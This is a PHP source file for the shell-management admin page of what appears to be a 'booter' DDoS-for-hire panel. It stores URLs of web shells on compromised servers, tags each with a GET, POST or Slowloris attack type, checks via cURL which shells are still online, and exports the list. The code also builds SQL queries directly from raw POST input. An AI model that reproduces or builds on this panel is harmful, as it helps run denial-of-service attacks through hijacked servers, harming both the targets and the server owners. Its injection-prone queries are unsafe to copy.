<?php

include('config.php');

if ($_SESSION['group'] != "administrator") header("Location: admin.php");

function isValidURL($url) {
	$urlregex = "^(https?|ftp)\:\/\/([a-z0-9+!*(),;?&=\$_.-]+(\:[a-z0-9+!*(),;?&=\$_.-]+)?@)?[a-z0-9+\$_-]+(\.[a-z0-9+\$_-]+)*(\:[0-9]{2,5})?(\/([a-z0-9+\$_-]\.?)+)*\/?(\?[a-z+&\$_.-][a-z0-9;:@/&%=+\$_.-]*)?(#[a-z_.-][a-z0-9+\$_.-]*)?\$";
	return eregi($urlregex, $url);
}

function checkShell($url) {
	
	if(!function_exists('curl_init')) {
   		die("This Konflict Shell Checker requires cURL.");
	}

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_VERBOSE, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    $page = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($code >= 200 && $code < 300) {
        // Success
		return TRUE;
    } else {
		// Failwhale
        return FALSE;
    }
}

if (isset($_POST['form_type'])) {
	
	switch ($_POST['form_type']) {
		case "logout_form":
			logout();
		break;
		case "shell_add_form":
			$type = $_POST['type'];
			$shell_array = stripslashes($_POST['s']);
			$shell_array = preg_split('/[\n\r]+/', $shell_array);
			$i = 0;
			
			foreach ($shell_array as $row) { 
			
				if (strpos($row,"http://") === FALSE) {
					$row = 'http://' . $row;	
				}
			
				if (isValidURL($row)) {
				
					mysql_query("INSERT INTO `shells` (`location`,`valid`,`date`,`type`) VALUES ('" . $row . "','TRUE','" . date("Y-m-d") . "','" . $type . "');") or die(mysql_error());
					
					$i ++;
				}
			}
			
			echo "<script>alert(\"$i valid shell(s) were added to the database.\");</script>";
		break;
		case "disable_form":
			$id = $_POST['disable_shell_id'];
			$e = mysql_fetch_array(mysql_query("SELECT `valid` FROM `shells` WHERE `id` = '" . $id . "';"));
			$e = $e['valid'];
			if ($e == "TRUE") mysql_query("UPDATE `shells` SET `valid` = 'FALSE' WHERE `id` = '" . $id . "';") or die (mysql_error());
			else mysql_query("UPDATE `shells` SET `valid` = 'TRUE' WHERE `id` = '" . $id . "';") or die (mysql_error());
		break;
		case "delete_form":
			$id = $_POST['delete_shell_id'];
			mysql_query("DELETE FROM `shells` WHERE `id` = '" . $id . "';") or die (mysql_error());
		break;
		case "delete_all_form":
			mysql_query("TRUNCATE TABLE `shells`;") or die (mysql_error());
		break;
		case "check_shell_form":
			$query = mysql_query("SELECT * FROM `shells`;") or die(mysql_error());
			if (mysql_num_rows($query) != 0) {
				$result_array = array();
				while ($row = mysql_fetch_array($query)) {
					$result_array[] = $row;	
				}
				foreach ($result_array as $row) {
				
					$id = $row['id'];
					$url = $row['location'];
					$valid = $row['valid'];
					
					$checkResult = "";
					if (checkShell($url) == TRUE) $check_result = "TRUE";
					else $check_result = "FALSE";
					
					mysql_query("UPDATE `shells` SET `valid` = '" . $check_result . "' WHERE `id` = '" . $id . "';") or die (mysql_error());
					
				}
			}
		break;
		case "delete_invalid_form":
			mysql_query("DELETE FROM `shells` WHERE `valid` = 'FALSE';") or die (mysql_error());
		break;
		default:
		break;
	}
}

$shell_array = array();
$shell_id_array = array();
$shell_query = mysql_query('SELECT * FROM `shells`;');
if (mysql_num_rows($shell_query) != 0) {
	while ($row = mysql_fetch_array($shell_query)) {
		$shell_array[] = $row;	
		$shell_id_array[] = $row['id'];
	}
	array_multisort($shell_id_array, $shell_array);
}

$last_row = ceil(count($shell_array) / SHELL_RESULTS_PER_PAGE);
$pages = $last_row;

$count = 1;

if (isset($_GET['page']) && is_numeric($_GET['page'])) {

	if ($_GET['page'] > $last_row) $count = $last_row;
	else if ($_GET['page'] < 0) $count = 1;
	else $count = $_GET['page'];
	
}

if ($pages != 1) {
	
	$offset = SHELL_RESULTS_PER_PAGE * ($count - 1);
	$stop = (SHELL_RESULTS_PER_PAGE);

	$shell_array = array_slice($shell_array, $offset, $stop);
	
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title><?php echo BOOTER_NAME . " - Admin Shells"; ?></title>
<link rel="stylesheet" href="style.css" type="text/css" media="screen" /> 
<script type="text/javascript">
function evaluate_shell_form() {
	var form = document.getElementById("shell_form");
	var error = false;
	if (form.elements["s"].value.length == 0) { flag_error("Please add at least one shell.","shell_error"); error = true; }
	if (!error)	form.submit();
}
function flag_error(c,id) {
	document.getElementById(id).innerHTML = c;
}
function enable_disable_shell(id) {
	document.getElementById("disable_shell_id").value = id;	
	if (confirm("Are you sure you wish to enable/disable this shell?")) document.getElementById("disable_form").submit();
}
function delete_shell(id) {
	document.getElementById("delete_shell_id").value = id;	
	if (confirm("Are you sure you wish to delete this shell?")) document.getElementById("delete_form").submit();	
}
function delete_all_shells() {
	if (confirm("Are you sure you wish to delete ALL shells?")) if (confirm("There is no going back, are you SURE?")) document.getElementById("delete_all_form").submit();	
}
function check_shells() {
	if (confirm("Are you sure you wish to check all of the shells?\n\nNOTE: This will take a long time.")) document.getElementById("check_shell_form").submit();
}
function delete_invalid_shells() {
	if (confirm("Are you sure you wish to delete all invalid shells?")) document.getElementById("delete_invalid_form").submit();
}
</script>
</head>
<body>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" id="disable_form"><input type="hidden" name="form_type" value="disable_form" /><input type="hidden" name="disable_shell_id" value="" id="disable_shell_id" /></form>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" id="delete_form"><input type="hidden" name="form_type" value="delete_form" /><input type="hidden" name="delete_shell_id" value="" id="delete_shell_id" /></form>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" id="delete_all_form"><input type="hidden" name="form_type" value="delete_all_form" /></form>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" id="check_shell_form"><input type="hidden" name="form_type" value="check_shell_form" /></form>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" id="delete_invalid_form"><input type="hidden" name="form_type" value="delete_invalid_form" /></form>
<center>
<div id="top">

<img class="logo" src="logo.png" />

<div class="tabs">
	<div class="tab" onclick="document.location.href='admin.php';">Admin Home</div>
	<div class="tab" onclick="document.location.href='admin_users.php';">Users</div>
	<div class="tab" onclick="document.location.href='admin_shells.php';">Shells</div>
    <div class="tab" onclick="document.getElementById('logout_form').submit();"><form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" id="logout_form" style="display:inline;"><input type="hidden" name="form_type" value="logout_form" id="logout_form" />Logout</form></div>
</div>

</div>

<div id="placeholder">

	<div id="placeholderL">
		<div class="left">
			<span class="title">Menu:</span>
			<ul class="menu">
				<?php echo left_menu(); ?>
           </ul>
		</div>
	</div>

<div id="placeholderR">
<div class="right"><br /><br />

<table width="576"><tr><td width="192" style="height:30px; background-color:#EEE; border:#666 1px solid; color:#000; text-align:center;"><?php echo "Total shells: <b>" . getAllShells() . "</b>"; ?></td>
<td width="192" style="height:30px; background-color:#9BFF9D; border:#00CA0F 1px solid; color:#000; text-align:center;"><?php echo "Online shells: <b>" . getOnlineShells() . "</b>"; ?></td>
<td width="192" style="height:30px; background-color:#F66; border:#C00 1px solid; color:#000; text-align:center;"><?php echo "Offline shells: <b>" . getOfflineShells() . "</b>"; ?></td></tr></table>
</div>

<div class="right"><br /><br />
<center>

<center><span class="heading_2" style="text-align:center; width:100%;">Add Shells</span></center><br />

<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post" id="shell_form">
<input type="hidden" name="form_type" value="shell_add_form" />
<table border="0" cellpadding="0" cellspacing="0"><tr><td colspan="2">
<span style="color:#FFF; padding-right:5px; vertical-align:bottom; font-size:12px;">Separate multiple shells with a new line (\n).</span>
</td></tr><tr><td height="5"> </td></tr>
<tr><td colspan="2">
<textarea style="width:500px; height:300px; resize:none;" name="s" class="input" placeholder="<?php echo "http://www.example.com/shell.php"; ?>"></textarea>
</td></tr>
<tr><td height="5"> </td></tr>
<tr><td><input type="radio" name="type" value="g" checked /> GET | <input type="radio" name="type" value="p" /> POST | <input type="radio" name="type" value="s" /> Slowloris</td><td>
<div style="float:right;"><table cellpadding="0" cellspacing="0" border="0"><tr><td width="100%" style="padding-right:10px;"><div style="float:right;"><span id="shell_error" class="error_box"><?php if ($flag_error[0] == "register_error") echo $flag_error[1]; ?></span></div></td><td><div style="float:right;"><a href="javascript:evaluate_shell_form();" style="text-decoration:none;"><div id="button">Add Shells</div></a></div></td></tr></table></div>
</td></tr>
</table>
</form>
</center>
<br /></div>
</div>

<div class="right">

<div class="tab" style="margin-left:0px; margin-bottom:5px;" onclick="check_shells();"><img src="checkmark.png" alt="Check Shells" border="0" width="15" height="15" /> Check Shells</div>
<div class="tab" style="margin-left:2px; margin-bottom:5px;" onclick="delete_invalid_shells();"><img src="delete.gif" alt="Delete Invalid Shells" border="0" width="15" height="15" /> Delete Invalid</div>
<div class="tab" style="margin-left:2px; margin-bottom:5px;" onclick="delete_all_shells();"><img src="delete.gif" alt="Delete All Shells" border="0" width="15" height="15" /> Delete All</div>
<div class="tab" style="margin-left:2px; margin-bottom:5px;" onclick="window.open('admin_shell_export.php');"><img src="notepad.png" alt="Export Shells" border="0" width="15" height="15" /> Export Shells</div>

<table cellpadding="5" cellspacing="0" border="1" style="color:#000; font-size:12px; width:100%;">
<tr><td id="tbox">ID</td><td id="tbox">Location</td><td id="tbox">Is Valid</td><td id="tbox">Date Added</td><td id="tbox">Type</td><td id="tbox">More</td></tr>
<?php

	$cs = '<td id="tebox">';
	$ce = '</td>';

	foreach ($shell_array as $row) {
		$id = $row['id'];
		$location = $row['location'];
		$valid = $row['valid'];
		$date = $row['date'];
		$type = $row['type'];
		
		switch ($type) {
		
			case 'g':
				$type = "GET";
			break;
			case 'p':
				$type = "POST";
			break;
			case 's':
				$type = "SLOW";
			break;
		
		}
		
		$ending = '<a href="javascript:enable_disable_shell(\'' . $id . '\');"><img src="lock.gif" alt="Invalidate/Validate Shell" border="0" width="15" height="15" /></a> <a href="javascript:delete_shell(\'' . $id . '\');"><img src="delete.gif" alt="Delete Shell" border="0" width="15" height="15" /></a>';
		
		echo '<tr>' . $cs . $id . $ce . $cs . $location . $ce . $cs . $valid . $ce . $cs . $date . $ce . $cs . $type . $ce . $cs . $ending . $ce . '</tr>';
		
	}

?>
</table>
<div style="width:100%; height:5px;">&nbsp;</div>
<div style="display:inline; color:#FFF; float:left;"><?php $c; if ($count == 0) $c = 1; else $c = $count; $l; if ($last_row == 0) $l = 1; else $l = $last_row; echo '<div class="dots" style="margin-top:5px; margin-left:0px;">Page ' . $c . ' of ' . $l . "</div>"; ?></div><div style="display:inline; color:#FFF; float:right;">
<?php

for ($offset = -2; $offset < 3; $offset ++) {
	
	$cur_page = $count + $offset;
	
	if ($offset == -2 && $count > 1) {
		
		echo '<div class="tab" style="margin-right:-5px;" onclick="document.location.href = \'admin_shells.php?page=' . ($count - 1) . '\';">Previous</div>';
			
	}	
	
	if ($cur_page < 1){}
	else if ($cur_page > $last_row) {}
	else {
		
		// The current page actually exists.
		
		if ($offset == -2 && $cur_page > 1) {
			
			echo '<div class="tab" onclick="document.location.href = \'admin_shells.php?page=1\';">1</div><div class="dots" style="padding-top:10px; margin-left:5px;">...</div>';
			
		}
		
		if ($offset == 0) {
			
			echo '<div class="tab" style="background-color:#F00; margin-left:5px;" onclick="document.location.href = \'admin_shells.php?page=' . $cur_page . '\';">' . $cur_page . '</div>';
			
		} else {
		
			echo '<div class="tab" style="margin-left:5px;" onclick="document.location.href = \'admin_shells.php?page=' . $cur_page . '\';">' . $cur_page . '</div>';
			
		}
		
		if ($offset == 2 && $cur_page < ($last_row)) {
			
			echo '<div class="dots" style="padding-top:10px; margin-left:5px; margin-right:-5px;">...</div><div class="tab" onclick="document.location.href = \'admin_shells.php?page=' . $last_row . '\';">' . $last_row . '</div>';
			
		}
		
	}
	
	if ($offset == 2 && $count < $last_row) {
		
		echo '<div class="tab" style="margin-right:1px; margin-left:5px;" onclick="document.location.href = \'admin_shells.php?page=' . ($count + 1) . '\';">Next</div>';
			
	}
	
}

?>

</div>
</div>

<div class="right">

<center><span class="heading_2" style="text-align:center; width:100%;">Shell Count Images</span></center><br /><br />

<table border="0" cellpadding="0" cellspacing="0" width="576"><tr><td align="center"><img src="image_red.php" /></td></tr><tr><td align="center"><img src="image_green.php" /></td></tr><tr><td align="center"><img src="image_blue.php" /></td></tr><tr><td align="center"><img src="image_yellow.php" /></td></tr></table>

<br />
</div>

<div id="footer"><?php echo footer(); ?></div>

</div>
</center>
</body>
</html>